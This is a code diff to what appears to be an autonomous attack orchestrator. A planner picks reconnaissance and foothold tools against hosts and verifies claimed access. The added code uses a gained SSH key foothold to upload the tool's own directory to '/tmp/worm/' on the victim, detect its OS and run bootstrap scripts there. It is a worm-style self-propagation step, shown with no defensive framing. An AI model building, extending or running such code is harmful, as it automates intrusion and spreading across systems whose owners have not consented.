@@ -1,6 +1,6 @@
 from analysis import analyze
 from planner import plan_next_actions
-from executor import execute_action
+from executor import execute_action, run
 from tool_normalizer import normalize_tool_output
 from hypothesizer import generate_hypotheses
 from progress import assess_progress
@@ -10,6 +10,19 @@ from verify_foothold import verify_foothold
 import tools
 from tools.registry import REGISTRY
 import networkx as nx
+
+FOOTHOLD_EXEC_MAP = {
+    "ssh_key": "ssh_exec",
+    "ssh_key_drop": "ssh_exec",
+    # "webshell": "curl_webshell_exec",
+    # "reverse_shell": "shell_session_exec",
+}
+
+def select_exec_tools(host):
+    if not host.foothold:
+        return []
+    name = FOOTHOLD_EXEC_MAP.get(host.foothold.get("type"))
+    return [REGISTRY[name]] if name and name in REGISTRY else []
 
 test_host = Host(
     id="host1",
@@ -25,7 +38,10 @@ test_host = Host(
 )
 
 # Define memory
-campaign = Campaign(graph=nx.DiGraph(), hosts=[test_host])
+campaign = Campaign(
+    graph=nx.DiGraph(),
+    hosts=[test_host],
+)
 
 # Discover network
 pass
@@ -53,6 +69,62 @@ def apply_update(host, update):
     if "vulnerabilities" in update:
         merge(host.vulnerabilities, update["vulnerabilities"])
 
+def upload_to_host(host, local_path, remote_path):
+    tool = REGISTRY["ssh_put"]
+    f = host.foothold["details"]
+    argv = tool.build_command({
+        "target_ip": host.ip,
+        "user": f["user"],
+        "key_path": f["local_key_path"],
+        "local_path": local_path,
+        "remote_path": remote_path,
+        "remote_os": "windows" if host.os == "windows" else "unix",
+    })
+    return run(argv, timeout=180)
+
+COMMANDS = {
+    "windows": ["./bootstrap.cmd"],
+    "linux": ["./bootstrap.sh"],
+    "mac": ["./bootstrap.sh"],
+}
+
+def detect_os(exec_fn) -> str:
+    r = exec_fn("uname -s")
+    if r["code"] == 0:
+        out = r["stdout"].strip()
+        if out == "Darwin":
+            return "mac"
+        if out == "Linux":
+            return "linux"
+    r = exec_fn("echo %OS%")
+    if "Windows_NT" in r["stdout"]:
+        return "windows"
+    return "unknown"
+
+def make_exec_fn(host):
+    tool = REGISTRY["ssh_exec"]
+    f = host.foothold["details"]
+    def exec_fn(command):
+        argv = tool.build_command({
+            "target_ip": host.ip,
+            "user": f["user"],
+            "key_path": f["local_key_path"],
+            "command": command,
+        })
+        return run(argv, timeout=30)
+    return exec_fn
+
+def run_hardcoded(host):
+    if not host.foothold:
+        print("[-] No verified foothold; nothing to run.")
+        return
+    exec_fn = make_exec_fn(host)
+    host.os = detect_os(exec_fn)
+    print(f"[*] Detected OS: {host.os}")
+    for c in COMMANDS.get(host.os, COMMANDS["linux"]):
+        r = exec_fn(c)
+        print(f"$ {c}  (exit {r['code']})\n{r['stdout']}{r['stderr']}")
+
 # Get basic facts of the host
 for host in campaign.hosts:
     progress = {"progress": "more_info_needed"}
@@ -62,7 +134,7 @@ for host in campaign.hosts:
 
         plan = plan_next_actions(host, analysis_result["inferences"],
                                 analysis_result["signals"], None, None,
-                                list(REGISTRY), phase)
+                                [t for t in REGISTRY.values() if t.category == "recon"], phase)
         print("Got plan:", plan)
 
         actions_queue = list(plan.get("Next Actions", []))
@@ -114,7 +186,7 @@ for host in campaign.hosts:
 
         for hypothesis in hypotheses:
             plan = plan_next_actions(host, analysis_result["inferences"], analysis_result["signals"],
-                                    analysis_result["unknowns"], hypothesis, list(REGISTRY), phase)
+                                    analysis_result["unknowns"], hypothesis, [t for t in REGISTRY.values() if t.category == "foothold"], phase)
 
             action_queue = list(plan.get("Next Actions", []))
             hypothesis_failed = False
@@ -151,8 +223,7 @@ for host in campaign.hosts:
                         host.foothold = None
                         reflection = {"decision": "replan", "reason": "Exploit output claimed access, but verification failed (false positive)."} 
                 else:
-                    # No claims found, use the standard reflector to decide what to do next
-                    reflection = evaluate_action_progress(host, normalized_result, action_queue)
+                    reflection = evaluate_action_progress(host, normalized_result, action_queue, phase)
                 if reflection["decision"] == "replan":
                     break
                 elif reflection["decision"] == "attempt_verify":
@@ -177,3 +248,6 @@ for host in campaign.hosts:
             if progress["progress"] == "established":
                 break
 
+    if host.foothold:
+        upload_to_host(host, ".", "/tmp/worm/")
+        run_hardcoded(host)
